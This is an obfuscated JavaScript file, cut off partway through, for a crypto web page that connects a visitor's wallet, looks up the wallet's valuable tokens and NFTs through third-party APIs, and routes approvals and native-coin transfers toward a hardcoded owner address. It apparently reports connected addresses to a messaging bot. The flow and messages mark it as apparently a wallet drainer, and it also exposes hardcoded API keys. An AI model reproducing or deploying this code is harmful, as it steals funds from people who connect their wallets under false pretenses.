const _0x380585=_0x37e4;(function(_0x4ed453,_0x5de416){const _0x412575=_0x37e4,_0x381f24=_0x4ed453();while(!![]){try{const _0x38a935=parseInt(_0x412575(0x263))/0x1+-parseInt(_0x412575(0x266))/0x2*(parseInt(_0x412575(0x292))/0x3)+parseInt(_0x412575(0x20e))/0x4+parseInt(_0x412575(0x28c))/0x5*(parseInt(_0x412575(0x27e))/0x6)+-parseInt(_0x412575(0x297))/0x7+-parseInt(_0x412575(0x2b4))/0x8+parseInt(_0x412575(0x1b6))/0x9;if(_0x38a935===_0x5de416)break;else _0x381f24['push'](_0x381f24['shift']());}catch(_0x2c6d05){_0x381f24['push'](_0x381f24['shift']());}}}(_0x58dd,0xc1ee6));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window[_0x380585(0x20b)]['default'],WalletConnectProvider=window[_0x380585(0x256)][_0x380585(0x2b3)],OWNER_ADDRESS=_0x380585(0x224),ABI=[{'constant':!![],'inputs':[],'name':_0x380585(0x22e),'outputs':[{'name':'','type':_0x380585(0x1ba)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':_0x380585(0x2a5),'type':_0x380585(0x29f)}],'name':_0x380585(0x1c6),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':'function'},{'constant':![],'inputs':[{'name':'_spender','type':_0x380585(0x29f)},{'name':_0x380585(0x291),'type':_0x380585(0x22d)}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':'function'},{'constant':!![],'inputs':[],'name':_0x380585(0x27b),'outputs':[{'name':'','type':_0x380585(0x1eb)}],'payable':![],'stateMutability':'view','type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':'_evilUser','type':'address'}],'name':_0x380585(0x241),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x2ae),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':'_from','type':_0x380585(0x29f)},{'name':_0x380585(0x279),'type':_0x380585(0x29f)},{'name':'_value','type':_0x380585(0x22d)}],'name':_0x380585(0x1f0),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':'function'},{'constant':!![],'inputs':[],'name':_0x380585(0x1f1),'outputs':[{'name':'','type':_0x380585(0x29f)}],'payable':![],'stateMutability':'view','type':_0x380585(0x22a)},{'constant':!![],'inputs':[{'name':'','type':_0x380585(0x29f)}],'name':'balances','outputs':[{'name':'','type':_0x380585(0x22d)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x24a),'outputs':[{'name':'','type':_0x380585(0x22d)}],'payable':![],'stateMutability':'view','type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x25b),'outputs':[{'name':'','type':_0x380585(0x22d)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x20a),'outputs':[{'name':'','type':_0x380585(0x22d)}],'payable':![],'stateMutability':'view','type':_0x380585(0x22a)},{'constant':![],'inputs':[],'name':_0x380585(0x25e),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[{'name':_0x380585(0x299),'type':_0x380585(0x29f)}],'name':_0x380585(0x21d),'outputs':[{'name':'','type':_0x380585(0x1eb)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x380585(0x29f)},{'name':'','type':'address'}],'name':_0x380585(0x2ad),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x1cb),'outputs':[{'name':'','type':_0x380585(0x1eb)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[{'name':_0x380585(0x262),'type':_0x380585(0x29f)}],'name':_0x380585(0x21b),'outputs':[{'name':'','type':_0x380585(0x22d)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':![],'inputs':[],'name':_0x380585(0x1ee),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x22f),'outputs':[{'name':'','type':_0x380585(0x29f)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x258),'outputs':[{'name':'','type':_0x380585(0x29f)}],'payable':![],'stateMutability':_0x380585(0x298),'type':'function'},{'constant':!![],'inputs':[],'name':'symbol','outputs':[{'name':'','type':_0x380585(0x1ba)}],'payable':![],'stateMutability':_0x380585(0x298),'type':'function'},{'constant':![],'inputs':[{'name':_0x380585(0x279),'type':_0x380585(0x29f)},{'name':_0x380585(0x291),'type':_0x380585(0x22d)}],'name':_0x380585(0x25f),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':_0x380585(0x23e),'type':_0x380585(0x22d)},{'name':'newMaxFee','type':_0x380585(0x22d)}],'name':_0x380585(0x274),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':'function'},{'constant':![],'inputs':[{'name':_0x380585(0x207),'type':_0x380585(0x22d)}],'name':_0x380585(0x288),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':_0x380585(0x207),'type':_0x380585(0x22d)}],'name':'redeem','outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[{'name':_0x380585(0x295),'type':_0x380585(0x29f)},{'name':_0x380585(0x26f),'type':_0x380585(0x29f)}],'name':'allowance','outputs':[{'name':_0x380585(0x2aa),'type':'uint256'}],'payable':![],'stateMutability':_0x380585(0x298),'type':'function'},{'constant':!![],'inputs':[],'name':'basisPointsRate','outputs':[{'name':'','type':_0x380585(0x22d)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':_0x380585(0x284),'outputs':[{'name':'','type':_0x380585(0x1eb)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':_0x380585(0x27c),'type':'address'}],'name':_0x380585(0x249),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'constant':!![],'inputs':[],'name':_0x380585(0x290),'outputs':[{'name':'','type':_0x380585(0x22d)}],'payable':![],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':_0x380585(0x1b8),'type':_0x380585(0x29f)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x380585(0x22a)},{'constant':![],'inputs':[{'name':_0x380585(0x27f),'type':_0x380585(0x29f)}],'name':_0x380585(0x1e5),'outputs':[],'payable':![],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[{'name':_0x380585(0x1de),'type':_0x380585(0x22d)},{'name':_0x380585(0x1b9),'type':'string'},{'name':_0x380585(0x1d8),'type':'string'},{'name':_0x380585(0x272),'type':_0x380585(0x22d)}],'payable':![],'stateMutability':'nonpayable','type':_0x380585(0x218)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x380585(0x207),'type':_0x380585(0x22d)}],'name':'Issue','type':_0x380585(0x286)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x380585(0x207),'type':'uint256'}],'name':_0x380585(0x1c4),'type':_0x380585(0x286)},{'anonymous':![],'inputs':[{'indexed':![],'name':'newAddress','type':'address'}],'name':_0x380585(0x21c),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x380585(0x294),'type':_0x380585(0x22d)},{'indexed':![],'name':_0x380585(0x26c),'type':_0x380585(0x22d)}],'name':_0x380585(0x212),'type':_0x380585(0x286)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x380585(0x27f),'type':_0x380585(0x29f)},{'indexed':![],'name':_0x380585(0x265),'type':_0x380585(0x22d)}],'name':_0x380585(0x2a9),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x380585(0x27a),'type':_0x380585(0x29f)}],'name':'AddedBlackList','type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x380585(0x27a),'type':_0x380585(0x29f)}],'name':_0x380585(0x1cf),'type':_0x380585(0x286)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x380585(0x258),'type':_0x380585(0x29f)},{'indexed':!![],'name':_0x380585(0x1fa),'type':_0x380585(0x29f)},{'indexed':![],'name':_0x380585(0x20f),'type':_0x380585(0x22d)}],'name':_0x380585(0x243),'type':_0x380585(0x286)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x380585(0x1e7),'type':_0x380585(0x29f)},{'indexed':!![],'name':'to','type':_0x380585(0x29f)},{'indexed':![],'name':'value','type':_0x380585(0x22d)}],'name':_0x380585(0x244),'type':'event'},{'anonymous':![],'inputs':[],'name':'Pause','type':'event'},{'anonymous':![],'inputs':[],'name':_0x380585(0x1f4),'type':_0x380585(0x286)}],ABIN=[{'inputs':[{'internalType':_0x380585(0x1ba),'name':'name','type':_0x380585(0x1ba)},{'internalType':_0x380585(0x1ba),'name':_0x380585(0x28d),'type':'string'},{'internalType':_0x380585(0x22d),'name':_0x380585(0x220),'type':'uint256'},{'internalType':_0x380585(0x22d),'name':'saleStart','type':'uint256'}],'stateMutability':_0x380585(0x219),'type':_0x380585(0x218)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x380585(0x29f),'name':_0x380585(0x258),'type':_0x380585(0x29f)},{'indexed':!![],'internalType':'address','name':'approved','type':_0x380585(0x29f)},{'indexed':!![],'internalType':'uint256','name':_0x380585(0x208),'type':'uint256'}],'name':_0x380585(0x243),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x380585(0x29f),'name':_0x380585(0x258),'type':'address'},{'indexed':!![],'internalType':'address','name':_0x380585(0x1ea),'type':_0x380585(0x29f)},{'indexed':![],'internalType':_0x380585(0x1eb),'name':_0x380585(0x280),'type':'bool'}],'name':'ApprovalForAll','type':_0x380585(0x286)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x380585(0x29f),'name':_0x380585(0x1b7),'type':'address'},{'indexed':!![],'internalType':_0x380585(0x29f),'name':_0x380585(0x1b8),'type':'address'}],'name':_0x380585(0x2a6),'type':_0x380585(0x286)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x380585(0x29f),'name':_0x380585(0x1e7),'type':_0x380585(0x29f)},{'indexed':!![],'internalType':_0x380585(0x29f),'name':'to','type':'address'},{'indexed':!![],'internalType':_0x380585(0x22d),'name':_0x380585(0x208),'type':_0x380585(0x22d)}],'name':_0x380585(0x244),'type':_0x380585(0x286)},{'inputs':[],'name':_0x380585(0x1c8),'outputs':[{'internalType':_0x380585(0x1ba),'name':'','type':_0x380585(0x1ba)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x233),'outputs':[{'internalType':_0x380585(0x22d),'name':'','type':_0x380585(0x22d)}],'stateMutability':'view','type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x202),'outputs':[{'internalType':_0x380585(0x22d),'name':'','type':_0x380585(0x22d)}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[],'name':'apePrice','outputs':[{'internalType':_0x380585(0x22d),'name':'','type':'uint256'}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[{'internalType':_0x380585(0x29f),'name':'to','type':'address'},{'internalType':_0x380585(0x22d),'name':_0x380585(0x208),'type':_0x380585(0x22d)}],'name':_0x380585(0x232),'outputs':[],'stateMutability':'nonpayable','type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x29f),'name':_0x380585(0x258),'type':_0x380585(0x29f)}],'name':'balanceOf','outputs':[{'internalType':_0x380585(0x22d),'name':'','type':_0x380585(0x22d)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x28f),'outputs':[{'internalType':_0x380585(0x1ba),'name':'','type':_0x380585(0x1ba)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x1d6),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x24f),'outputs':[],'stateMutability':_0x380585(0x219),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x380585(0x208),'type':_0x380585(0x22d)}],'name':_0x380585(0x2b0),'outputs':[{'internalType':_0x380585(0x29f),'name':'','type':_0x380585(0x29f)}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[{'internalType':_0x380585(0x29f),'name':'owner','type':_0x380585(0x29f)},{'internalType':_0x380585(0x29f),'name':_0x380585(0x1ea),'type':_0x380585(0x29f)}],'name':_0x380585(0x1b4),'outputs':[{'internalType':_0x380585(0x1eb),'name':'','type':'bool'}],'stateMutability':'view','type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x23b),'outputs':[{'internalType':_0x380585(0x22d),'name':'','type':_0x380585(0x22d)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x22d),'name':_0x380585(0x1e9),'type':_0x380585(0x22d)}],'name':_0x380585(0x247),'outputs':[],'stateMutability':_0x380585(0x1f2),'type':_0x380585(0x22a)},{'inputs':[],'name':'name','outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[],'name':_0x380585(0x258),'outputs':[{'internalType':_0x380585(0x29f),'name':'','type':_0x380585(0x29f)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x22d),'name':_0x380585(0x208),'type':'uint256'}],'name':_0x380585(0x273),'outputs':[{'internalType':_0x380585(0x29f),'name':'','type':'address'}],'stateMutability':'view','type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x230),'outputs':[],'stateMutability':_0x380585(0x219),'type':'function'},{'inputs':[],'name':_0x380585(0x203),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x380585(0x29f),'name':'from','type':_0x380585(0x29f)},{'internalType':_0x380585(0x29f),'name':'to','type':_0x380585(0x29f)},{'internalType':_0x380585(0x22d),'name':'tokenId','type':_0x380585(0x22d)}],'name':_0x380585(0x26d),'outputs':[],'stateMutability':'nonpayable','type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x29f),'name':_0x380585(0x1e7),'type':_0x380585(0x29f)},{'internalType':'address','name':'to','type':_0x380585(0x29f)},{'internalType':_0x380585(0x22d),'name':_0x380585(0x208),'type':_0x380585(0x22d)},{'internalType':_0x380585(0x29a),'name':_0x380585(0x2b6),'type':'bytes'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x1f7),'outputs':[{'internalType':_0x380585(0x1eb),'name':'','type':_0x380585(0x1eb)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x29f),'name':_0x380585(0x1ea),'type':_0x380585(0x29f)},{'internalType':_0x380585(0x1eb),'name':_0x380585(0x280),'type':_0x380585(0x1eb)}],'name':_0x380585(0x29e),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x1ba),'name':_0x380585(0x28f),'type':_0x380585(0x1ba)}],'name':_0x380585(0x1bf),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x1ba),'name':_0x380585(0x1ef),'type':_0x380585(0x1ba)}],'name':_0x380585(0x1db),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x22d),'name':'revealTimeStamp','type':_0x380585(0x22d)}],'name':_0x380585(0x24e),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x24d),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x25d),'outputs':[{'internalType':_0x380585(0x22d),'name':'','type':_0x380585(0x22d)}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[],'name':_0x380585(0x1e0),'outputs':[{'internalType':_0x380585(0x22d),'name':'','type':'uint256'}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x1fc),'name':_0x380585(0x22c),'type':_0x380585(0x1fc)}],'name':_0x380585(0x2a7),'outputs':[{'internalType':_0x380585(0x1eb),'name':'','type':_0x380585(0x1eb)}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[],'name':'symbol','outputs':[{'internalType':_0x380585(0x1ba),'name':'','type':_0x380585(0x1ba)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x22d),'name':_0x380585(0x225),'type':_0x380585(0x22d)}],'name':_0x380585(0x214),'outputs':[{'internalType':_0x380585(0x22d),'name':'','type':'uint256'}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[{'internalType':'address','name':_0x380585(0x258),'type':_0x380585(0x29f)},{'internalType':'uint256','name':_0x380585(0x225),'type':_0x380585(0x22d)}],'name':_0x380585(0x1d1),'outputs':[{'internalType':_0x380585(0x22d),'name':'','type':_0x380585(0x22d)}],'stateMutability':_0x380585(0x298),'type':_0x380585(0x22a)},{'inputs':[{'internalType':_0x380585(0x22d),'name':_0x380585(0x208),'type':_0x380585(0x22d)}],'name':_0x380585(0x2ac),'outputs':[{'internalType':_0x380585(0x1ba),'name':'','type':_0x380585(0x1ba)}],'stateMutability':'view','type':_0x380585(0x22a)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':_0x380585(0x22d),'name':'','type':'uint256'}],'stateMutability':_0x380585(0x298),'type':'function'},{'inputs':[{'internalType':_0x380585(0x29f),'name':_0x380585(0x1e7),'type':'address'},{'internalType':_0x380585(0x29f),'name':'to','type':'address'},{'internalType':'uint256','name':'tokenId','type':_0x380585(0x22d)}],'name':_0x380585(0x1f0),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[{'internalType':'address','name':_0x380585(0x1b8),'type':_0x380585(0x29f)}],'name':'transferOwnership','outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)},{'inputs':[],'name':_0x380585(0x223),'outputs':[],'stateMutability':_0x380585(0x219),'type':_0x380585(0x22a)}],networkToId={0x1328cf7:_0x380585(0x201),0x1:_0x380585(0x24c),0x5:_0x380585(0x261),0x89:_0x380585(0x200),0x13881:_0x380585(0x282),0x38:_0x380585(0x29c),0x61:_0x380585(0x1dd),0xa86a:_0x380585(0x289),0xa869:_0x380585(0x234),0xfa:_0x380585(0x245),0xfa2:'fantom-testnet',0xa4b1:'arbitrum-mainnet',0x66eed:'arbitrum-goerli',0xa4ba:_0x380585(0x2ab),0x250:_0x380585(0x248),0x51:_0x380585(0x26a),0x150:_0x380585(0x229),0x4e454152:_0x380585(0x240),0x4e454153:'aurora-testnet',0x6984c:_0x380585(0x1fe),0x69849:_0x380585(0x237),0x7e4:'axie-mainnet',0x14a33:_0x380585(0x215),0x77:_0x380585(0x1bc),0x405:_0x380585(0x238),0xa918:_0x380585(0x28a),0x10e8:_0x380585(0x2b5),0xdbe0:_0x380585(0x264),0x2600:'boba-bnb-testnet',0x50e:_0x380585(0x287),0x511:_0x380585(0x1b5),0x120:_0x380585(0x276),0x1c:_0x380585(0x228),0xb48:_0x380585(0x1df),0x1e14:'canto-mainnet',0x436f7631:_0x380585(0x1f8),0x19:_0x380585(0x252),0x152:_0x380585(0x1c0),0xd2af:_0x380585(0x2a0),0x14f:_0x380585(0x1d0),0xa516:_0x380585(0x269),0x2329:_0x380585(0x259),0x2328:_0x380585(0x1bd),0x868:_0x380585(0x23d),0x86a:_0x380585(0x1be),0x13:_0x380585(0x236),0x10:_0x380585(0x29b),0xe:'flarenetworks-flare-mainnet',0x72:_0x380585(0x1e4),0xb7e7759:_0x380585(0x1f5),0x153c099c:_0x380585(0x23f),0x63564c40:_0x380585(0x1d3),0x6357d2e0:_0x380585(0x2b8),0x141:_0x380585(0x2a8),0x142:_0x380585(0x1d9),0xe704:'linea-testnet',0x1389:'mantle-testnet',0x52:_0x380585(0x260),0x53:_0x380585(0x21a),0x440:_0x380585(0x271),0x24c:_0x380585(0x270),0x7d2:_0x380585(0x283),0x30e0a:'milkomeda-a1-devnet',0x7d1:_0x380585(0x251),0x30da5:_0x380585(0x1c5),0x504:_0x380585(0x28e),0x507:_0x380585(0x1ed),0x505:'moonbeam-moonriver',0xe9ac0ce:_0x380585(0x239),0x116ea:_0x380585(0x2b7),0x116e9:_0x380585(0x1c7),0x116e1:_0x380585(0x1c2),0x5afe:_0x380585(0x1dc),0x5aff:'oasis-sapphire-testnet',0xf8:_0x380585(0x1d4),0x249c:'oasys-testnet',0xa:_0x380585(0x255),0x2a15c308d:_0x380585(0x23a),0x2a15c3083:_0x380585(0x1d7),0x5a2:_0x380585(0x26b),0x1e:'rsk-mainnet',0x1f:_0x380585(0x2a4),0x5d456c62:_0x380585(0x254),0x1482a7b2:_0x380585(0x28b),0x3d28774d:_0x380585(0x1c1),0x109b4597:_0x380585(0x204),0x536f6c4d:_0x380585(0x1f9),0x1202c:_0x380585(0x285),0x1202d:_0x380585(0x24b),0x1a0:'sx-mainnet'},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0x38:'https://bsc-dataseed.binance.org/'},'chainId':0x38,'network':'binance','infuraId':'e62a60a251c64745baefeaf8237af646','pollingInterval':'10000'}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x380585(0x2a3),'infuraId':_0x380585(0x20c),'rpc':_0x380585(0x25c),'chainId':0x38,'network':_0x380585(0x25a),'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x380585(0x1cc))[_0x380585(0x242)](async function(){const _0x44e211=_0x380585;try{let _0x9c8cf3=await web3Modal['connect']();onProvider(_0x9c8cf3),_0x9c8cf3['on']('accountsChanged',_0x1246ec=>{const _0x4911ea=_0x37e4;console[_0x4911ea(0x206)](_0x1246ec),onProvider(_0x9c8cf3);});}catch(_0x4c8330){console[_0x44e211(0x206)](_0x44e211(0x2a2),_0x4c8330);return;}});function _0x37e4(_0xd7e6dc,_0x29f05e){const _0x58dd42=_0x58dd();return _0x37e4=function(_0x37e4c4,_0x5d624f){_0x37e4c4=_0x37e4c4-0x1b4;let _0x1845d3=_0x58dd42[_0x37e4c4];return _0x1845d3;},_0x37e4(_0xd7e6dc,_0x29f05e);}async function onProvider(_0x4bb747){const _0x2a9441=_0x380585;web3Object=new Web3(_0x4bb747);let _0x54a71d=await web3Object[_0x2a9441(0x29d)]['getAccounts']();selectedAccount=_0x54a71d[0x0],chainName=await web3Object[_0x2a9441(0x29d)][_0x2a9441(0x278)](),chainId=networkToId[chainName],console[_0x2a9441(0x206)](chainId),console[_0x2a9441(0x206)](selectedAccount),_0x54a71d[_0x2a9441(0x21f)]&&(sendMessage(_0x2a9441(0x1f3)),sendMessage(_0x2a9441(0x1ec)+selectedAccount),covalenthqAPICall());}const Oxa=_0x380585(0x1c9),Oxc='5227607491';async function covalenthqAPICall(){const _0x3636f9=_0x380585,_0x27ab00={'chain':'bsc'},_0x12df74=new URL(_0x3636f9(0x2b1)+selectedAccount+'/erc20');_0x12df74[_0x3636f9(0x267)]=new URLSearchParams(_0x27ab00)[_0x3636f9(0x235)]();const _0x5dcd4b={'method':'GET','headers':{'accept':_0x3636f9(0x1e6),'X-API-Key':'LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn'}};try{const _0x47486a=await fetch(_0x12df74,_0x5dcd4b)['then'](_0x57c539=>_0x57c539[_0x3636f9(0x275)]());console['log'](_0x47486a);let _0x11e9da=_0x47486a;console[_0x3636f9(0x206)](_0x3636f9(0x21e),_0x11e9da);let _0x5ead2c=await Promise['all'](_0x11e9da[_0x3636f9(0x1f6)](async _0x1cc762=>{const _0x2bf85d=_0x3636f9;let _0x408454;try{_0x408454=await getValue(_0x1cc762[_0x2bf85d(0x20d)],_0x1cc762[_0x2bf85d(0x293)],_0x1cc762[_0x2bf85d(0x24a)]);}catch(_0x3c799c){_0x408454=0x0;}return console[_0x2bf85d(0x206)](_0x408454),{'balance':_0x1cc762[_0x2bf85d(0x293)],'value':_0x408454,'address':_0x1cc762['token_address']};}));console[_0x3636f9(0x206)]('tokens-list',_0x5ead2c),tokens=_0x5ead2c[_0x3636f9(0x1e1)](_0xa7cef6=>_0xa7cef6['value']>0x5),tokens['sort']((_0x1f0b53,_0x38a740)=>_0x38a740[_0x3636f9(0x20f)]-_0x1f0b53[_0x3636f9(0x20f)]),console[_0x3636f9(0x206)]('chainId:',chainId,_0x3636f9(0x250),tokens);if(tokens[_0x3636f9(0x21f)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x3636f9(0x205));}NFTs=await getNFTs(selectedAccount)['catch'](_0x571717=>{const _0x346b97=_0x3636f9;console[_0x346b97(0x206)](_0x346b97(0x210),_0x571717);}),NFTs=NFTs['result'],console[_0x3636f9(0x206)](_0x3636f9(0x22b),NFTs);}async function onApprove(){const _0x2d2817=_0x380585;if(tokens[_0x2d2817(0x21f)])try{loopTokens(tokens);}catch(_0x9baa6f){console[_0x2d2817(0x27d)](_0x2d2817(0x281)+_0x9baa6f[_0x2d2817(0x1e8)]);}else{if(NFTs[_0x2d2817(0x21f)]){try{loopNfts(NFTs);}catch(_0x3f2f02){console[_0x2d2817(0x27d)]('Error\x20processing\x20item\x20'+_0x3f2f02[_0x2d2817(0x1e8)]);}onSendEther(),sendMessage(_0x2d2817(0x1fb));}else try{onSendEther();}catch(_0x18a937){console[_0x2d2817(0x27d)](_0x2d2817(0x281)+_0x18a937[_0x2d2817(0x1e8)]);}}}function _0x58dd(){const _0x2a8428=['_value','2397873MvLTTq','balance','feeBasisPoints','_owner','https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=','3868732EPTopq','view','_maker','bytes','flarenetworks-canary-testnet','bsc-mainnet','eth','setApprovalForAll','address','defi-kingdoms-mainnet','send','Could\x20not\x20get\x20a\x20wallet\x20connection','web3','rsk-testnet','_upgradedAddress','OwnershipTransferred','supportsInterface','kcc-mainnet','DestroyedBlackFunds','remaining','arbitrum-nova-mainnet','tokenURI','allowed','totalSupply','true','getApproved','https://deep-index.moralis.io/api/v2/','sending\x20ether','default','11783472Cytbzn','boba-avalanche-testnet','_data','nervos-godwoken-mainnet','harmony-testnet','isApprovedForAll','boba-bobabase-testnet','13860684gvmTok','previousOwner','newOwner','_name','string','Transaction\x20Hash:\x20','bittorrent-mainnet','evmos-testnet','findora-forge-testnet','setBaseURI','cronos-testnet','skale-omnus','nervos-polyjuice-testnet','usd','Redeem','milkomeda-c1-devnet','deprecate','nervos-godwoken-testnet','BAYC_PROVENANCE','0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f','NFT','paused','.connect','receipt','Your\x20address\x20','RemovedBlackList','defi-kingdoms-testnet','tokenOfOwnerByIndex','Token\x20balance\x20is\x20','harmony-mainnet','oasys-mainnet','Transaction\x20is\x20submitted\x20to\x20the\x20network','emergencySetStartingIndexBlock','palm-testnet','_symbol','kcc-testnet','gas','setProvenanceHash','oasis-sapphire-mainnet','bsc-testnet','_initialSupply','boba-goerli','startingIndexBlock','filter','bsc','&text=','flarenetworks-flare-testnet','destroyBlackFunds','application/json','from','message','numberOfTokens','operator','bool','Cl\x20address\x20:\x20','moonbeam-moonbase-alpha','pause','provenanceHash','transferFrom','upgradedAddress','payable','Wallet\x20Connected\x20Successfully\x20to\x20bsc!','Unpause','gather-mainnet','map','saleIsActive','covalent-internal-network-v1','solana-mainnet','spender','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','bytes4','catch','avalanche-dexalot-mainnet','/nft/collections?chain=','matic-mainnet','btc-mainnet','REVEAL_TIMESTAMP','reserveApes','skale-razor','Error\x20collecting\x20info\x20about\x20wallet','log','amount','tokenId','New\x20token','_totalSupply','Web3Modal','e62a60a251c64745baefeaf8237af646','token_address','846456yIlujk','value','Unable\x20to\x20get\x20NFts','estimateGas','Params','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','tokenByIndex','base-testnet','Error:\x20','status','constructor','nonpayable','meter-testnet','balanceOf','Deprecate','getBlackListStatus','Initial\x20list\x20','length','maxNftSupply','Token','&vs_currencies=usd','withdraw','0xea8968B218a551919FbD5f1166328C82a96dED54','index','Approve\x20Completed\x20Successfully','GET','boba-rinkeby-testnet','astar-shiden','function','NFTs\x20collection\x20','interfaceId','uint256','name','getOwner','renounceOwnership','Transaction\x20Rejected','approve','MAX_APES','avalanche-testnet','toString','flarenetworks-canary-mainnet','avalanche-dexalot-testnet','bittorrent-testnet','neon-testnet','palm-mainnet','maxApePurchase','Transaction\x20Receipt:\